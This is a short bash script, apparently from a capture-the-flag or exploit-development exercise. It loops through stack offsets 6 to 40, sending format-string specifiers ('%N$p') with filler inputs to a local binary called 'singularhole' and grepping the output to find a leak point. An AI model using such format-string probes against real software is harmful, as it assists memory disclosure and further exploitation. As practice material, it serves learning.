for i in {6..40}; do
    echo -n "Offset $i: "
    {
        printf "%%%s\$p\n" "$i"
        printf "dummy\n"
        printf "0\n"
        printf "0\n"
    } | stdbuf -o0 ./singularhole | grep "Well hello"
done